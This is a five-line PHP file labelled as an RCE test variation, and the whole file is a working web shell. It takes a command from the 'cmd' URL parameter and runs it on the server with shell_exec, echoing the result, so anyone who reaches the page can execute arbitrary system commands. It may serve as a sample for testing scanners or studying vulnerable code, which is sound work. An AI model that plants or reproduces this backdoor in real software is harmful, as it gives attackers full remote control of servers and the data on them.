<?php
// RCE test variation #1391
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>